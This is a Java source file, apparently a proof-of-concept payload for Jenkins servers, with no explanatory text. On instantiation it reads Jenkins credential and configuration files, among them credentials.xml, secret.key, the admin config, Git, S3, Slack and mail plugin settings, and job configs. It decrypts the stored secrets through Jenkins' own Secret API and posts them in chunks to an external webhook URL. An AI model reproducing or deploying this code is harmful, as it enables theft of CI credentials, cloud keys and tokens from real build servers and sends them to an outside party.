import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
    static final Pattern BLOB = Pattern.compile("\\{[A-Za-z0-9+/=]{16,}\\}");

    public poc() {
        String data;
        try { data = run(); } catch (Throwable t) { data = "P9 fatal " + t; }
        int total = data.length();
        for (int i = 0; i < total && i < 4000000; i += 100000) {
            try { post("P9|" + i + "|" + data.substring(i, Math.min(total, i + 100000))); }
            catch (Throwable t) { }
        }
    }

    static void post(String s) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000);
        c.setReadTimeout(25000);
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream();
        os.write(s.getBytes("UTF-8"));
        os.flush();
        os.close();
        c.getResponseCode();
    }

    static String run() throws Exception {
        StringBuilder sb = new StringBuilder();
        String jh = System.getenv("JENKINS_HOME");
        if (jh == null || jh.length() == 0) { jh = "/var/lib/jenkins"; }
        Path base = Paths.get(jh);
        sb.append("P9 jh=").append(jh).append(" java=").append(System.getProperty("java.version")).append("\n");
        Class<?> secretClass = null;
        Method fromString = null;
        Method getPlain = null;
        try {
            secretClass = Class.forName("hudson.util.Secret");
            fromString = secretClass.getMethod("fromString", String.class);
            getPlain = secretClass.getMethod("getPlainText");
            sb.append("Secret API: OK\n");
        } catch (Throwable t) { sb.append("Secret API FAIL ").append(t).append("\n"); }

        String[] targets = {"credentials.xml", "config.xml", "users/admin/config.xml",
                            "hudson.plugins.s3.S3BucketPublisher.xml", "hudson.plugins.git.GitSCM.xml",
                            "hudson.tasks.Mailer.xml", "jenkins.plugins.slack.webhook.GlobalConfig.xml",
                            "hudson.plugins.slack.SlackNotifier.xml", "secret.key"};
        for (int ti = 0; ti < targets.length; ti++) {
            append(sb, base, targets[ti], fromString, getPlain);
        }
        try {
            Path jobs = base.resolve("jobs");
            if (Files.isDirectory(jobs)) {
                DirectoryStream<Path> ds = Files.newDirectoryStream(jobs);
                int n = 0;
                for (Path p : ds) {
                    if (n++ > 40) { break; }
                    append(sb, base, "jobs/" + p.getFileName().toString() + "/config.xml", fromString, getPlain);
                }
            }
        } catch (Throwable t) { sb.append("jobs ERR ").append(t).append("\n"); }
        return sb.toString();
    }

    static void append(StringBuilder sb, Path base, String rel, Method fromString, Method getPlain) {
        try {
            Path p = base.resolve(rel);
            if (!Files.isRegularFile(p)) { sb.append("== MISS ").append(rel).append("\n"); return; }
            byte[] raw = Files.readAllBytes(p);
            String txt = new String(raw, "UTF-8");
            boolean looksText = true;
            for (int i = 0; i < Math.min(raw.length, 200); i++) { if (raw[i] == 0) { looksText = false; break; } }
            sb.append("== FILE ").append(rel).append(" ").append(raw.length).append("B text=").append(looksText).append("\n");
            if (!looksText) { sb.append("(binary)\n"); return; }
            if (looksText && raw.length <= 20000) { sb.append(txt).append("\n"); }
            if (fromString == null) { return; }
            Matcher m = BLOB.matcher(txt);
            int i = 0;
            while (m.find()) {
                String blob = m.group();
                String plain;
                try {
                    Object s = fromString.invoke(null, blob);
                    plain = String.valueOf(getPlain.invoke(s));
                } catch (Throwable t) { plain = "DECRYPT_FAIL " + t; }
                sb.append("-- ").append(rel).append(" secret#").append(i++).append(" -> ").append(plain).append("\n");
            }
        } catch (Throwable t) { sb.append("== ERR ").append(rel).append(" ").append(t).append("\n"); }
    }
}
